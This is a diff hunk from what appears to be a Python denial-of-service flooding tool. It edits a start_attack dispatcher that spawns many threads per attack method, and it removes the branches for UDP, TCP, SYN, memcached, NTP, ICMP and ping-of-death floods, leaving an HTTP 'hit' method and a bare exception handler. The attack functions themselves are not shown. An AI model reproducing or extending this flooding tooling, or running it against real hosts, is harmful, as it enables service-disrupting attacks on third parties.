@@ -92,35 +92,6 @@ def start_attack(method, threads, event, socks_type):
         elif method == "hit":
             for _ in range(threads):
                 threading.Thread(target=hit, args=(event, timer), daemon=True).start()
-
-        # layer4
-
-        elif method == "vse":
-            for _ in range(threads):
-                threading.Thread(target=vse, args=(event, timer), daemon=True).start()
-        elif method == "udp":
-            for _ in range(threads):
-                threading.Thread(target=udp, args=(event, timer), daemon=True).start()
-        elif method == "tcp":
-            for _ in range(threads):
-                threading.Thread(target=tcp, args=(event, timer), daemon=True).start()
-        elif method == "syn":
-            for _ in range(threads):
-                threading.Thread(target=syn, args=(event, timer), daemon=True).start()
-        elif method == "mem":
-            for _ in range(threads):
-                threading.Thread(target=mem, args=(event, timer), daemon=True).start()
-        elif method == "ntp":
-            for _ in range(threads):
-                threading.Thread(target=ntp, args=(event, timer), daemon=True).start()
-
-        # layer3
-        elif method == "icmp":
-            for _ in range(threads):
-                threading.Thread(target=icmp, args=(event, timer), daemon=True).start()
-        elif method == "pod":
-            for _ in range(threads):
-                threading.Thread(target=pod, args=(event, timer), daemon=True).start()
     except:
         pass
 
